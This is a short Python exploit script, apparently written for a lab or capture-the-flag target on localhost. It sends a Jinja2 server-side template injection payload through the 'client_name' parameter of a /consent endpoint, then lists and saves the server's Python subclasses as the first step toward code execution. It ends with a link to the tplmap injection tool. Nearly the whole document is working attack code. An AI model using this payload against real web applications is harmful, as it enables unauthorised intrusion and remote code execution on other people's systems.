import requests
import os,sys,re

##
##

victim_ip = "localhost"
port = "666"
url = f"http://localhost:666/consent"

# Step 1: Enumerate subclasses
enumerate_payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
params = {
    "client_name": enumerate_payload,
    "scope": "None"
}

response = requests.get(url, params=params)
if response.status_code == 200:
    # Extract class names using regex
    subclasses = re.findall(r"<class '([^']+)'>", response.text)
    # Print the list with indices
    for idx, cls in enumerate(subclasses):
        print(f"{idx}: {cls}")
    # Optionally, save to a file for easier searching
    with open("subclasses.txt", "w") as f:
        for idx, cls in enumerate(subclasses):
            f.write(f"{idx}: {cls}\n")
else:
    print(f"Failed to enumerate subclasses. Status Code: {response.status_code}")

##
##
## https://github.com/epinna/tplmap
##
##
